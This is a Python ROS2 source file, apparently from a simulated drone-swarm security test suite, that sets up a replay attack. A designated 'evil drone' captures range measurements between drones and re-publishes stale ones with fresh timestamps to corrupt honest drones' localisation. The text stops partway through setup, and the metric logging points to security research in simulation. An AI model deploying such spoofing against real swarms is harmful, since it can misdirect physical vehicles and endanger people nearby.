#!/usr/bin/env python3
"""
Replay attack on cooperative localisation range topics
=======================================================
Captures live range measurements from inter_drone_ranging.py,
buffers them, then re-injects stale ones with fresh timestamps.
Honest drones localise against a frozen swarm configuration.

Evil drone: px4_2 (standard evil-drone convention across this attack suite)
Honest drones: px4_1, px4_3, px4_4, px4_5

Run:
    ros2 run swarm_discovery replay_attack
    ros2 run swarm_discovery replay_attack freeze    # worst case
    ros2 run swarm_discovery replay_attack delayed   # rolling 5s lag

Smoke test (short run, for parameter tuning):
    SMOKE_ATTACK_SEC=20 SMOKE_WARMUP_SEC=3 \\
        ros2 run swarm_discovery replay_attack delayed

STRIDE: Spoofing, Denial of Service

PATCH NOTES (validation pass):
  - No logic change required: EVIL_DRONE already px4_2, matching the
    standardised evil-drone convention used across the attack suite.
  - ATTACK_SEC / WARMUP_SEC overridable via env vars for smoke testing.
  - Validation: validate_attacks.py::check_replay confirms msg_age_s
    actually exceeds ~1s during the attack phase (i.e. the buffer is
    populated and stale messages are being replayed, not silently
    skipped because _buffer[(EVIL_DRONE, observed)] is empty).
"""
import os, sys, csv, time, collections
import numpy as np
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import PoseStamped, PointStamped

EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3", "px4_4", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]
REPLAY_MODE   = "delayed"
DELAY_SEC     = float(os.environ.get("SMOKE_DELAY_SEC", 5.0))
BUFFER_SEC    = 15.0
WARMUP_SEC    = float(os.environ.get("SMOKE_WARMUP_SEC", 10.0))
PUBLISH_HZ    = 25.0
ATTACK_SEC    = float(os.environ.get("SMOKE_ATTACK_SEC", 90.0))
LOG_FILE      = "/tmp/replay_attack_metrics.csv"


class ReplayAttack(Node):
    def __init__(self, mode):
        super().__init__("replay_attack")
        self.mode       = mode
        self.start_time = time.monotonic()
        self._buffer    = {}
        self.est        = {d: None for d in HONEST_DRONES}
        self.gt         = {d: None for d in ALL_DRONES}

        pairs = [(o, d) for o in ALL_DRONES for d in ALL_DRONES if o != d]
        for pair in pairs:
            self._buffer[pair] = collections.deque()

        # Subscribe to all range topics to capture them
        for observer in ALL_DRONES:
            for observed in ALL_DRONES:
                if observer == observed:
                    continue
                self.create_subscription(
                    PointStamped,
                    f"/{observer}/coop/range_to/{observed}",
                    lambda msg, o=observer, d=observed: self._on_range(o, d, msg),
                    10)

        # Subscribe to ground truth and estimates
        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped,
                f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped,
                f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)

        # Replay publishers — inject stale ranges on evil drone's outbound topics
        self._replay_pubs = {}
        for observed in HONEST_DRONES:
            topic = f"/{EVIL_DRONE}/coop/range_to/{observed}"
            self._replay_pubs[(EVIL_DRONE, observed)] = self.create_publisher(
                PointStamped, topic, 10)

        # CSV
        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
